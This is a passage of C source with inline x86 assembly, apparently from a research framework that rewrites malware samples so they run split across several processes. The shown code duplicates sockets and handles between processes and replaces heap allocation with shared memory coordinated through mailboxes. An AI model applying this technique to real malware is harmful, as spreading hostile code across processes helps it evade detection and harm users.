			mov		eax, [esi+ebx]						// eax = loctrl->duptab[C].handle[pididx]
														//
		locduphdl_cleanup:								//
			pop edx										// restore registers
			pop ebx										//
			pop esi										//
			popfd										// restore flags
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// locduphdl2(): Locate 2 duplicated socket/handle. This function is simply calls locduphdl() twice.
	//
	// Arguments: eax (void*) : 1st original SOCKET/HANDLE value
	//            ebx (void*) : 2nd original SOCKET/HANDLE value
	//
	// Return Value: Function returns the correct duplicated values of the SOCKETs/HANDLEs in eax and ebx. 
	//	If that value does not found, function returns -1.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_locduphdl2_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// locduphdl2() function prolog
			// --------------------------------------------------------------------------
		locduphdl2:										//
			call	locduphdl							// find handle for 1st argument (eax)
			xchg	eax, ebx							// switch arguments
			call	locduphdl							// find handle for 2nd argument (ebx)
			xchg	eax, ebx							// switch again to preserve the order 
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// crtdupsock(): "Duplicate" the socket. Initially, function inserts the original socket in an empty 
	//		slot in duptab. Then for each process, it duplicates the socket based on the pid and puts the 
	//		WSAPROTOCOL_INFO structure to every process's mailbox.
	//
	// Arguments: eax (void*) : original SOCKET value
	//
	// Return Value: Function returns the correct duplicated value of the SOCKET/HANDLE. If an error occured
	//	function exits with the error code. Because this function gets executed from basic block it's hard
	//	to handle errors. We have chosen not to handle them for this moment.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_crtdupsock_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
														//
		crtdupsock:										//
			// --------------------------------------------------------------------------
			// crtdupsock() function prolog
			// --------------------------------------------------------------------------
		//	pushfd										// backup flags
			cmp		eax, 0xffffffff						// if socket is invalid
			jne		crtdupsock_start					//
		//	popfd										// restore flags
			retn										// don't do anything
		crtdupsock_start:								//
			push	esi									// backup registers that you're going to use
			push	edi									//
			push	ebx									//
			push	edx									//
			push	eax									// eax contains socket that needs to be duplicated
			xor		eax, eax							// eax = NULL
			call	duptab_intsearch					// search for an empty slot
			cmp		eax, 0xffffffff						// if table is full, function will fail
			jz		crtdupsock_cleanup					// if no error occured, go on
														//
			nop											// addicted to nops :)
			call	loctrl_backup_rd					// esi = loctrl from local storage
			add		esi, DUPTABOFF						// esi = loctrl->duptab
			imul	ebx, eax, DUPTABENTSZ 				// esi = loctrl->duptab[emptyidx]
			pop		eax									// eax = original SOCKET
			mov		dword ptr[esi + ebx], eax			// loctrl->duptab[emptyidx].origval = SOCKET
			mov		word ptr[esi + ebx + 4], DUPSOCK	// loctrl->duptab[emptyidx].type = DUPSOCK
			push	esi									//
			add		[esp], ebx							// take a backup of: esi + ebx
			// --------------------------------------------------------------------------
			// insert this SOCKET to current process's entry in handle table
			// --------------------------------------------------------------------------
			push	esi									// backup esi
			call	get_noebp_local_storage_esi			// get local storage
			lea		edx, ds:[esi + noebp_pididx]		// 
			pop		esi									// restore esi
			mov		edx, [edx]							// edx = pididx
			lea		ebx, [ebx + 8 + edx*4]				// get offset in handle table
			mov		[esi + ebx], eax					// loctrl->duptab[emptyidx].handle[pididx] = SOCKET
			// --------------------------------------------------------------------------
			// for the other processes, we have to duplicate the socket and put the
			// WSAPROTOCOL_INFO structure to their mailbox
			// --------------------------------------------------------------------------
			call	loctrl_backup_rd					// esi = loctrl from local storage
			lea		edi, [esi + MAILBOXOFF]				// edi = loctrl->mailbox
			mov		ecx, [esi + NPROCOFF]				// ecx = loctrl->nproc
			add		esi, PIDTABOFF						// esi = loctrl->pidtab
														//
		crtdupsock_loop:								//
			movzx	ebx, word ptr[esi + ecx*4 - 4]		// ebx = loctrl->pidtab[ecx - 1]
			test	ebx, ebx							// DEBUG ONLY: if it's NULL, don't duplicate
			jz		crtdupsock_skip						// (pid's are sequential, so we can't have NULLs)
														//
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edx, dword ptr ds:[eax + noebp_pid]	// read pid
			pop		eax									// restore eax
			cmp		ebx, [edx]							// compare pid with your pid
			jz		crtdupsock_skip						// don't write on your own mailbox!
			// --------------------------------------------------------------------------
			// send message to every pid through mailbox
			// --------------------------------------------------------------------------
			push	eax									// WSADuplicateSocketA modifies eax and ecx
			push	ecx									// backup them
														//
			lea		edx, [ecx - 1]						// off by one to ecx
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		ecx, MAXMAILBOXSIZE					// maximum number of slots
														//
		crtdupsock_find_empty_mail_slot:				//
			cmp		word ptr[edi + edx], 0x0000			// is slot filled?
			je		crtdupsock_empty_mail_slot_found	// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			loop	crtdupsock_find_empty_mail_slot		// continue search
														// if you reach this point, all slots are filled
			jmp		crtdupsock_skipnpop					// so, do not send
		crtdupsock_empty_mail_slot_found:				// send message to mailbox
														//
			mov		word ptr[edi + edx], CMD_DUPSOCKINIT// loctrl->mailbox[ecx-1].cmd = CMD_DUPSOCKINIT
			mov		dword ptr[edi + edx + 4], eax		// loctrl->mailbox[ecx-1].handle = SOCKET
														//
			lea		edx, [edi + edx + 16]				// 
			push	edx									// arg3: lpProtocolInfo (loctrl->mailbox[ecx-1].data)
			push	ebx									// arg2: dwProcessId
			push	eax									// arg1: s
			call	get_noebp_local_storage_eax			// get local storage
			mov		eax, ds:[eax + noebp_WSADuplicateSocketA]	// read address of WSADuplicateSocketA()
			call	eax									// call WSADuplicateSocketA()
			test	eax, eax							// if eax == 0 then no errors happened
			jne		crtdupsock_popncleanup				// abort
														//
		crtdupsock_skipnpop:							// skip and pop registers
			pop		ecx									// restore registers
			pop		eax									//
		crtdupsock_skip:								//
			loop	crtdupsock_loop						// get next entry
			// --------------------------------------------------------------------------
			// crtdupsock() function epilog
			// --------------------------------------------------------------------------
		crtdupsock_cleanup:								//
			add		esp, 4								// remove the backup of esi + ebx
			pop		edx									// restore registers
			pop		ebx									//
			pop		edi									//
			pop		esi									//
			retn										// return
		crtdupsock_popncleanup:							//
			pop		ecx									// restore ecx and eax
			pop		eax									//
			pop		eax									// restore esi + ebx
			mov		dword ptr[eax] , 0x00				// loctrl->duptab[i].origval = 0
			mov		word ptr[eax + 4], 0x00				// loctrl->duptab[i].type = 0
			// WARNING: we may have garbage entries in duptab[i].handle upon error.
			// TODO: Clear every entry of handle
			sub		esp, 4								// to balance "add esp, 4" later
			jmp		crtdupsock_cleanup					// and now do the normal cleanup
	}
	//-------------------------------------------------------------------------------------------------------
	// crtduphandle(): Duplicate a HANDLE. This function reserves a new entry in duptab. Then for each valid
	//	entry in pid table, it open the target process, duplicates the handle, close the target process, and
	//	store the duplicated handle in the right place in duptab. Note that the target process doesn't has to
	//	do anything, so we don't have to send any mail.
	//
	// Arguments: eax (void*) : original HANDLE value
	//
	// Return Value: If function succeds, the return value is the same original HANDLE. Otherwise function
	//	returns -1.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_crtduphandle_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// crtduphandle() function prolog
			// --------------------------------------------------------------------------
		crtduphandle:									//
			cmp		eax, 0xffffffff						// invalid handle?
			jne		crtduphandle_start					// if so just return
			retn										//
		crtduphandle_start:								//
			push	edx									// backup registers that you're going to use
			push	ecx									//
			push	ebx									//
			push	esi									//
			push	ebp									// function prolog 
			mov		ebp, esp							// (we can modify ebp)
			sub		esp, 0x30							// 48 bytes seem enough									
			// --------------------------------------------------------------------------
			// initialize pointers and other local variables
			// --------------------------------------------------------------------------
			mov		[ebp - 0x04], eax					// backup original HANDLE
			call	get_noebp_local_storage_esi			// get local storage
			mov		ebx, ds:[esi + noebp_pid]			// 
			mov		[ebp - 0x08], ebx					// v8 = current process ID
			mov		ebx, ds:[esi + noebp_OpenProcess]	//
			mov		[ebp - 0x0c], ebx					// vc = &OpenProcess()
			mov		ebx, ds:[esi+noebp_DuplicateHandle]	//
			mov		[ebp - 0x10], ebx					// v10 = &DuplicateSocket()
			mov		ebx, ds:[esi + noebp_CloseHandle]	//	
			mov		[ebp - 0x14], ebx					// v14 = &CloseHandle()
														//
			call	loctrl_backup_rd					// esi = loctrl from local storage
			mov		[ebp - 0x18], esi					// 
			add		dword ptr [ebp - 0x18], PIDTABOFF	// v18 = loctrl->pidtab
														//
			movzx	ecx, word ptr[esi + NPROCOFF]		// ecx = loctrl->nproc
			// --------------------------------------------------------------------------
			// find an empty entry in duptab and initiallize it
			// --------------------------------------------------------------------------
			xor		eax, eax							// arg1: NULL
			call	duptab_intsearch					// search for an empty slot
			cmp		eax, 0xffffffff						// if table is full, function will fail
			je		crtduphandle_cleanup				// if no error occured, go on
														//
			imul	eax, DUPTABENTSZ					// move to the right place in duptab
			lea		esi, ds:[esi + DUPTABOFF + eax + 8]	// esi = loctrl->duptab[i].handle
			mov		[ebp - 0x20], esi					// v20 = loctrl->duptab[i].handle
														//
			mov		eax, [ebp - 0x04]					// eax = original HANDLE
			mov		dword ptr[esi - 8], eax				// loctrl->duptab[i].origval = HANDLE
			mov		word ptr[esi - 4], DUPHANDLE		// loctrl->duptab[i].type = DUPHANDLE
			// --------------------------------------------------------------------------
			// for each pid != NULL, duplicate handle and store in the right place in duptab
			// --------------------------------------------------------------------------
		crtduphandle_loop:
			mov		esi, dword ptr[ebp - 0x18]			// esi = &loctrl->pidtab
			mov		ebx, dword ptr[esi + ecx*4 - 4]		// ebx = loctrl->pidtab[j]
			test	ebx, ebx							// NULL pid?
			jz		crtduphandle_loopend				// if so, move to the next slot
			cmp		ebx, [ebp - 0x08]					// also exclude your pid
			jnz		crtduphandle_duplicate				// (don't duplicate your own handle)	
			// --------------------------------------------------------------------------
			// instead you have to copy the original HANDLE in the right slot in duptab
			// --------------------------------------------------------------------------
			push	[ebp - 0x04]						// original HANDLE in stack
			pop		[ebp - 0x1c]						// move it to the location of duplicated HANDLE
			jmp		crtduphandle_storehdl				// store it in duptab
			// --------------------------------------------------------------------------
			// a different pid found. Do the actual handle duplication procss
			//
			// WARNING: A source of potential error, is the pseudo handle for source process 
			//  we use. We can use the real handle instead by calling OpenProcess() for current 
			//  process.
			// --------------------------------------------------------------------------
		crtduphandle_duplicate:							//
			mov		[ebp - 0x24], ecx					// backup ecx
														//
			push	ebx									// dwProcessId
			push	0x01								// bInheritHandle: TRUE
			push	0x00000040							// dwDesiredAccess (PROCESS_DUP_HANDLE)
			call	[ebp - 0x0c]						// OpenProcess()
			test	eax, eax							// function failed?
			jz		crtduphandle_error					// if yes, return error
			// push	eax									// backup target process handle
			mov		ebx, eax							// backup target process handle
														//						
			push	0x00000002							// dwOptions: DUPLICATE_SAME_ACCESS
			push	0x01								// bInheritHandle: TRUE
												 		// This MUST BE TRUE if you want CreatePipe to work :)
			push	0x00000000							// dwDesiredAccess: (ignored)
			lea		esi, [ebp - 0x1c]					// 
			push	esi									// lpTargetHandle: store duphandle in &v1c
			push	eax									// hTargetProcessHandle: the one opened by OpenProcess()
			push	dword ptr[ebp - 0x4]				// hSourceHandle: original HANDLE
			push	0xffffffff							// hSourceProcessHandle: HANDLE-1 (for current process)
			call	[ebp - 0x10]						// DuplicateHandle()
			// pop		ebx								// restore target process handle
			test	eax, eax							// function failed?
			jz		crtduphandle_error					// if yes, return error
														//
			push	ebx									// hObject: hTargetProcessHandle
			call	[ebp - 0x14]						// CloseHandle()
			test	eax, eax							// function failed?
			jz		crtduphandle_error					// if yes, return error
														//
			mov		ecx, dword ptr[ebp - 0x24]			// restore ecx
			// --------------------------------------------------------------------------
			// store duplicated handle in duptab
			// --------------------------------------------------------------------------
		crtduphandle_storehdl:							//			
			mov		esi, [ebp - 0x20]					// esi = loctrl->duptab[i].handle
			push	[ebp - 0x1c]						// duplicated HANDLE in stack
			pop		[esi + ecx*4 - 4]					// loctrl->duptab[i].handle[j] = duplicated HANDLE
														//
		crtduphandle_loopend:							//
			loop	crtduphandle_loop					// get next pid
			// --------------------------------------------------------------------------
			// crtduphandle() function epilog
			// --------------------------------------------------------------------------												
			mov		eax, [ebp - 0x04]					// return original HANDLE
			jmp		crtduphandle_cleanup				// skip error
		crtduphandle_error:								//
			mov		esi, [ebp - 0x20]					//
			mov		dword ptr[esi - 8], 0x00			// clear origval, so this will be empty
			mov		word ptr[esi - 4], 0x00				// clear origval, so this will be empty
			// WARNING: we may have garbage entries in duptab[i].handle upon error.
			// TODO: Clear every entry of handle
			mov		eax, 0xffffffff						// return an invalid handle
		crtduphandle_cleanup:							//
			leave										// delete local stack frame			
			pop		esi									// restore registers
			pop		ebx									//
			pop		ecx									//
			pop		edx									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// crtduphandle2(): Create 2 duplicated HANDLEs. This function is simply calls crtduphandle() twice.
	//
	// Arguments: eax (void*) : 1st HANDLE value to insert in duptab
	//            ebx (void*) : 2nd HANDLE value to insert in duptab
	//
	// Return Value: None. However, function has to leave any registers it used intact.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_crtduphandle2_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// crtduphandle2() function prolog
			// --------------------------------------------------------------------------
		crtduphandle2:									//
			call	crtduphandle						// insert 1st HANDLE in duptab
			xchg	eax, ebx							// switch arguments
			call	crtduphandle						// insert 1st HANDLE in duptab
			xchg	eax, ebx							// switch again to preserve the order 
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// closedupsock(): Close a duplicate socket/handle. At a first glance the name is silly cause we don't
	//	actually close any socket/handle. What we really do, is to clear the corresponding entry in duptab, 
	//	and send amail to every other process to inform them to close their duplicated socket/handle. 
	//	Function returns the correct value of the duplicated sokcet. After this call, closesocket() or 
	//	CloseHandle() will called by original program, so the 1st duplicated SOCKET/HANDLE will be closed by 
	//	the original program.
	//
	// NOTE (from winAPI manual): "The underlying socket, however, will remain open until closesocket is
	//	called by the last remaining descriptor." The same is true for duplicated HANDLEs because we 
	//	duplicate them with the option DUPLICATE_CLOSE_SOURCE disabled.
	//
	// NOTE2: As you know, this is called from basic block, so we cannot reference executer() local variables
	//	as ebp will be different. Fortunately we can modify ebp, and thus we can use some local space :)
	//
	// Arguments: eax (void*) : original SOCKET/HANDLE value
	//
	// Return Value: Function returns the duplicated version of the socket. If socket is not found, function
	//	returns INVALID_SOCKET_VALUE (0xffffffff).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_closedupsock_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// closedupsock() function prolog
			// --------------------------------------------------------------------------
		closedupsock:									//
			push	edx									// backup registers that you're going to use
			push	ecx									//
			push	ebx									//
			push	esi									//
			push	ebp									// function prolog
			mov		ebp, esp							// (we can modify ebp)
			sub		esp, 0x30							// 32 bytes seem enough	for stack frame
			mov		dword ptr [ebp - 4], eax			// backup original handle
			// --------------------------------------------------------------------------
			// initialize pointer to mailbox and duptab
			// --------------------------------------------------------------------------
			call	duptab_intsearch					// search the open SOCKET (it's in eax)
			cmp		eax, 0xffffffff						// SOCKET found?
			jz		closedupsock_cleanup				// if no error occured, go on
														//
			call	loctrl_backup_rd					// esi = loctrl from local storage
			mov		[ebp - 0xc], esi					// 
			add		dword ptr [ebp - 0xc], MAILBOXOFF	// vc = loctrl->mailbox
														//
			add		esi, DUPTABOFF						// esi = loctrl->duptab
			imul	ebx, eax, DUPTABENTSZ 				// esi = loctrl->duptab[idx]
			mov		dword ptr [esi + ebx], 0x00			// loctrl->duptab[idx].origval = NULL
			push	word ptr [esi + ebx + 4]			//
			pop		[ebp - 0x14]						// v14 =  loctrl->duptab[idx].type
			mov		word ptr [esi + ebx + 4], 0x00		// loctrl->duptab[idx].type = 0
														//
			lea		esi, [esi + ebx + 8]				// esi = loctrl->duptab[idx].handle
			mov		[ebp - 8], esi						// v8 = loctrl->duptab[idx].handle
			mov		ecx, MAXCONCURNPROC					// set up counter
			// --------------------------------------------------------------------------
			// iterate over duptab entry, send a message to each process and clear all SOCKETs
			// --------------------------------------------------------------------------
		closedupsock_loop:								//
			lea		edx, [ecx - 1]						// off by one to ecx
			lea		esi, [esi + edx*4]					// esi = loctrl->duptab[idx].handle[i]
			cmp		dword ptr[esi], 0x00				// if it's NULL skip this entry
			je		closedupsock_skip					//
														//
			push	esi									// backup esi
			call	get_noebp_local_storage_esi			// locate local storage
			lea		eax, dword ptr ds:[esi+noebp_pididx]// get index in pidtab
			pop		esi									// restore esi
			cmp		edx, [eax]							// is current entry from this process?
			jne		closedupsock_mail					// if not send a mail 
														//
			mov		eax, dword ptr [esi]				// v4 = corret duplicated SOCKET to be returned
			mov		dword ptr[esi], 0x00				// clear that entry
			mov		dword ptr [ebp - 4], eax			//
			jmp		closedupsock_skip					// don't send to your mailbox
														//
		closedupsock_mail:								//
			mov		ebx, [ebp - 0xc]					// vc = loctrl->mailbox
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		eax, MAXMAILBOXSIZE					// maximum number of slots
														//
		closedupsock_find_empty_mail_slot:				//
			cmp		word ptr[ebx + edx], 0x0000			// is slot filled?
			je		closedupsock_empty_mail_slot_found	// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			cmp		eax, 0x00							// count to zero?
			ja		closedupsock_find_empty_mail_slot	// if not continue search
			// loop	closedupsock_find_empty_mail_slot	// avoid loop cause it uses ecx
														// if you reach this point, all slots are filled
			jmp		closedupsock_cleanup				// so, do not send
														//
		closedupsock_empty_mail_slot_found:				// send message to mailbox
														//
			cmp		dword ptr[ebp - 0x14], DUPSOCK		// close a SOCKET?
			jz		closedupsock_sock_type				//	
														//
			mov		word ptr[ebx+edx],CMD_DUPHANDLECLOSE// loctrl->mailbox[ecx-1].cmd = CMD_DUPHANDLECLOSE
			jmp		closedupsock_next					// skip "else" branch
		closedupsock_sock_type:							//
			mov		word ptr[ebx+edx], CMD_DUPSOCKCLOSE	// loctrl->mailbox[ecx-1].cmd = CMD_DUPSOCKCLOSE
														//		
		closedupsock_next:								//
			push	dword ptr[esi]						//
			pop		dword ptr[ebx + edx + 4]			// loctrl->mailbox[ecx-1].handle = duplicated SOCKET/HANDLE	
														//
			mov		dword ptr[esi], 0x00				// loctrl->duptab[idx].handle[i] = NULL
			//mov		ecx, [ebp - 0x24]					// restore ecx
														//
		closedupsock_skip:								//
			mov		esi, [ebp - 0x8]					// esi = loctrl->duptab[idx].handle
			loop	closedupsock_loop					// go back
			// --------------------------------------------------------------------------
			// closedupsock() function epilog
			// --------------------------------------------------------------------------
		closedupsock_cleanup:							//
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_7_ENABLE_SPINS__
			// --------------------------------------------------------------------------
			// enable & initialize spin counter
			// --------------------------------------------------------------------------
			call	loctrl_backup_rd					// esi = &loctrl from local storage
			mov		[esi + SPINOFF], SPINCOUNTER		// loctrl->spin = SPINCOUNTER
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			mov		eax, [ebp - 4]						// get the right SOCKET to return
			leave										// release local stack frame
			pop 	esi									// restore registers
			pop 	ebx									//
			pop 	ecx									//
			pop		edx									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                                  H E A P   M A N I P U L A T I O N                                || //
// ++===================================================================================================++ //
//
// When a block of the original malware needs to allocate some memory on the heap, we have to "propagate"
// this allocation to other processes. The problem is that the allocated memory for process A won't be 
// accessible from process B as processes have different address spaces. The obvious way to solve this 
// problem is to allocate shared memory and inform all processes about this allocation.
//
// The best way to do that is to provide replacements for memory allocation/deallocation functions
// and use them whenever we want to allocate/deallocate some memory in the heap. We implemented 3
// basic (and 1 auxuliary) functions. Of course a complete solution would require to implement much
// more heap manipulation functions, but here we only implemented the most basic ones:
//   [1]. allocmem()    : Allocate some shared memory (CORE)
//   [2]. freemem()     : Release some shared memory (CORE)
//   [3]. mapmem()      : Map something to the shared memory (CORE)
//   [4]. freenrwdmem() : Unmap some shared memory and rewind global heap pointer (AUX)
//
// Our IDA plugin is responsible for identifying the heap manipulation functions and install the right
// hooks at the right places. Thus, functions malloc(), LocalAlloc(), GlobalAlloc() and HeapAlloc() will
// all replaced by allocmem().
//
// The way that shared heap is implemented is extremely simple: "nxtheapaddr" variable contains the next
// free address that memory should be allocated. Once we allocate some memory, we shift this pointer and
// align it to 64KB (MapViewOfFile works only for 64KB aligned addresses). I know that the right solution
// is to keep track of the free regions, having free lists, coalesce consequtive segments, etc. No, I 
// won't do this in assembly :) The point here is just to get the samples to work.
//
//
// FIX: A potential fix would be to implement a real heap manipulation module.
//
// WARNING: As in duptab* manipulation we don't preserve EFLAGS register upon function epilog. 
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// allocmem(): This function is called instead of a standard memory allocation function like malloc(),
	//	HeapAlloc(), etc. allocmem() allocates a shared memory region, and informms the other processes to
	//	attach by sending the proper mail. Memory allocations must be done in predefined addresses, so every
	//	process can access them at the same RVA. A cute way to do this is to have a global pointer at shctrl
	//	that shows each time the address of the next memory allocation. After allocation, we increase that
	//	pointer and we align it to 64KB (It can't be less than 64KB in shared memory). Thus we can always 
	//	allocate memory. Note that it's possible tomake that pointer, point to invalid locations by 
	//	increasing it too much. That's however is very rareand we won't consider such cases here.
	//
	//	NOTE: We modify ebp (yes we can), to make it point to the initial value. That's required to be able
	//		to call CreateFileMappingA() and MapViewOfFileEx() in attachreg(). Thus we create a stack frame
	//		without ebp (only with esp). Thus we must be very careful when pushing values, because all the 
	//		offsets are chagning.
	//
	//	NOTE 2: attachreg() returns 2 values: 1 address and 1 open handle. We ignore that open handle though.
	//		If we want to deal with the open handle, we can keep a list of all allocated region in shctrl.
	//		each element will contain a list (address, handle for P1, handle for P2, etc). During free, we 
	//		can close the appropriate handle (it's like duptab!). But too much work for nothing :P. Oh yeah 
	//		we ignore open handles here...
	//
	// Arguments (fastcall): ecx (uint) : The memory size that needs to be allocated
	//
	// Return Value: Function returns a pointer to the newly allocated memory. In case of an error occured, 
	//	function returns NULL.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_allocmem_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// allocmem() function prolog
			// --------------------------------------------------------------------------
		allocmem:										//
			push	ebp									// we're going to modify ebp
			push	edx									// backup register that you're going to use
			push	ebx									//
			push	esi									//
			push	edi									//
			// pusha									// backup all registers
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			lea		edx, dword ptr ds:[esi + noebp_global]
			push	edx									// v20 = & "Global\\"
			push	dword ptr ds:[esi + noebp_pid]		// v1c = pid
														//
			// we can move values from an address to another address in the stack
			// by using push instructions
			mov		esi, [loctrl]						// esi = &loctrl
			push	[esi + NXTHEAPADDROFF]				// v18 = loctrl->nxtheapaddr
			push	ecx									// v14 = memory size
			sub		esp, 0x14							// allocate the rest of the space
			// --------------------------------------------------------------------------
			// In order to create a shared region we have to assign a unique name for it.
			// A simple solution is to find an 1-1 mapping from the base address of the
			// shared region to a string. We convert each digit (we have totally 8) to ASCII
			// by adding the constant 'a'. The result will be an 8 character unique string.
			// The string doesn't really make any sense, but the goal is just to be unique.
			// --------------------------------------------------------------------------
			mov		ecx, 0x08							// we have 32 bit addresses
			mov		ebx, [esp + 0x20]					// address of region's name
			mov		esi, [esp + 0x18]					// next heap address
		allocmem_itoa_loop:								//
			mov		edx, esi							// copy address
			and		dl, 0xf								// get last digit
			add		dl, 0x61							// add 'a'
			mov		byte ptr[ebx + ecx + 6], dl			// append it to the string "Global\\"
			shr		esi, 4								// drop the last digit
			loop	allocmem_itoa_loop					// get next digit
			mov		ecx, [esp + 0x14]					// restore ecx
			// --------------------------------------------------------------------------
			// do the actual memory allocation
			// --------------------------------------------------------------------------
			push	[esp + 0x18]						// arg3: predefined address
			mov		edx, ecx							// arg2: size of shared region
			mov		ecx, [esp + 0x20 + 4]				// arg1: shared region name (+4 for the push of arg3)
			call	attachreg							// allocate memory
			cmp		eax, 0xffffffff						// error returned?
			je		allocmem_error						// attachreg (take care of possible open handle)
			mov		[esp + 0x4], eax					// backup address that needs to be returned
			// --------------------------------------------------------------------------
			// update next heap address (align it to 64KB) - if allocation was successfull
			//
			// WARNING: As you can see we always increase the base address. It's possible to reach
			//	addresses that we won't be able to allocate memory. As we start from 0x0cc00000
			//	it's pretty hard for this to happen. Thus we can safely ignore that case.
			// -------------------------------------------------------------------------
			mov		ecx, [esp + 0x14]					// restore memory size
			mov		esi, [esp + 0x18]					// esi = loctrl->nxtheapaddr		
			lea		edx, [esi + ecx + 0x10000]			// make esi point to the end of the allocated memory
			and		edx, 0xffff0000						// align to 64KB
			mov		esi, [loctrl]						// ecx = &loctrl
			mov		[esi + NXTHEAPADDROFF], edx			// update next heap address
			// --------------------------------------------------------------------------
			// now send mail to each process
			// (you'll see an ugly code repetition from crtdusock here :( ...)
			// --------------------------------------------------------------------------
			lea		edi, [esi + MAILBOXOFF]				// edi = loctrl->mailbox
			movzx	ecx, word ptr[esi + NPROCOFF]		// ecx = loctrl->nproc
			add		esi, PIDTABOFF						// esi = loctrl->pidtab
			mov		[esp + 0x0c], esi					// backup loctrl->pidtab
			mov		[esp + 0x10], edi					// backup loctrl->mailbox
														//
		allocmem_loop:									//
			mov		ebx, [esi + ecx*4 - 4]				// ebx = loctrl->pidtab[ecx - 1]
			test	ebx, ebx							// DEBUG ONLY: if it's NULL, don't duplicate
			jz		allocmem_skip						// (pid's are sequential, so we can't have NULLs)
			cmp		ebx, [esp + 0x1c]					// compare pid with your pid
			jz		allocmem_skip						// don't write on your own mailbox!
			// --------------------------------------------------------------------------
			// send message to every pid through mailbox
			// --------------------------------------------------------------------------
			mov		[esp + 0x8], ecx					// backup ecx
			lea		edx, [ecx - 1]						// off by one to ecx
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		ecx, MAXMAILBOXSIZE					// maximum number of slots
														//
		allocmem_find_empty_mail_slot:					//
			cmp		word ptr[edi + edx], 0x0000			// is slot filled?
			je		allocmem_empty_mail_slot_found		// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			loop	allocmem_find_empty_mail_slot		// continue search
														// if you reach this point, all slots are filled
			jmp		allocmem_error						// so, do not send
														//
		allocmem_empty_mail_slot_found:					// send message to mailbox
			mov		word ptr[edi + edx], CMD_ALLOCMEM	// loctrl->mailbox[ecx-1].cmd = CMD_ALLOCMEM
			mov		eax, [esp + 0x14]					// get desired address
			mov		dword ptr[edi + edx + 0xc], eax		// loctrl->mailbox[ecx-1].reserved2[0] = base address
			mov		eax, [esp + 0x04]					// get size
			mov		dword ptr[edi + edx + 0x8], eax		// loctrl->mailbox[ecx-1].reserved2[1] = size
			// --------------------------------------------------------------------------
			// copy shared region name to mailbox
			// --------------------------------------------------------------------------
			mov		ecx, 0x10							// strlen("Global\\...") = 16 = constant
			mov		esi, [esp + 0x20]					// address of shared region name
			lea		edi, dword ptr[edi + edx + 16]		// edi = loctrl->mailbox[ecx-1].data
			rep	movsb									// copy name to mailbox
														//
			mov		ecx, [esp + 0x8]					// restore ecx
		allocmem_skip:									//
			mov		esi, [esp + 0x0c]					// restore esi
			mov		edi, [esp + 0x10]					// edi = loctrl->mailbox
			loop	allocmem_loop						// get next entry														
			// --------------------------------------------------------------------------
			// allocmem() function epilog
			// --------------------------------------------------------------------------
			mov		eax, [esp + 4]						// get addreess of allocated memory
			jmp		allocmem_cleanup					// skip error
		allocmem_error:									//
			mov		eax, 0xffffffff						// set error code (ERROR_HEAP_ALLOC_FAILED)
		allocmem_cleanup:								//
			add		esp, 0x24							// release stack frame
			pop		edi									//	restore registers
			pop		esi									//
			pop		ebx									//
			pop		edx									//
			pop		ebp									// restore ebp
			// popa										// restoreall registers
